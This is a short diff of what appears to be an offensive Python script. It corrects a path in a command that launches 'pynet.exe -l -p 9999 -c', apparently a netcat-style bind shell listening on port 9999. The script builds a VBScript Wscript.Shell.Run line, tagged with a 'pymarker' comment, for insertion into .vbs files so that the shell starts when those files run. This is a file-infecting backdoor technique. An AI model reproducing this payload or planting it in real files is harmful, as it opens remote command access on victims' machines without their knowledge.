@@ -36,7 +36,7 @@ In this scenario, we run "pynet.exe" which is an executable version of a Python 
 
 If you replace the command, modify the file_types code snippers accordingly.
 '''
-command = "C:\\WINDOWS\\TEMPT\\pynet.exe -l -p 9999 -c"
+command = "C:\\WINDOWS\\TEMP\\pynet.exe -l -p 9999 -c"
 
 file_types[".vbs"] = ["\r\n'pymarker\r\n", "\r\nCreateObject(\"Wscript.Shell\".Run(\"{}\")\r\n".format(command)]
 
